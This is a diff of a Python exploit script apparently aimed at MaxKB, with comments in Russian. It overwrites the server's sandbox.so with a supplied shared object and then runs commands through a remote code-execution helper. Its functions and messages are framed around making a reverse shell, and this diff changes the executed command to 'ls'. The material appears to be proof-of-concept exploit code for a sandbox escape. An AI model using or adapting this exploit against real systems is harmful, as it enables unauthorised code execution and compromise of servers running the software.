@@ -113,10 +113,10 @@ def execute_python_code(code):
         return f"Exception: {e}"
 
 
-def rev_shell():
+def ls_for_rev_shell():
     """Выполнение ls через Python"""
     code = """import os
-os.popen("")"""
+os.popen("ls")"""
 
     return execute_python_code(code)
 
@@ -167,7 +167,7 @@ def main():
     # Перезапись sandbox.so
     print("\n[+] Step 3: Remote sandbox.so Write")
     test_path = "/opt/maxkb-app/sandbox/sandbox.so"
-    with open("new_sandbox.so", "rb") as f:
+    with open("ls_sandbox.so", "rb") as f:
         raw = f.read()
 
     print(raw)
@@ -177,8 +177,8 @@ def main():
     print(f"[Write Result] {result}")
 
     # Вызываем ls
-    print("\n[*] Make reverse shell:")
-    read_back = rev_shell()
+    print("\n[*] Execut 'ls' For reverse shell:")
+    read_back = ls_for_rev_shell()
 
 if __name__ == "__main__":
     main()
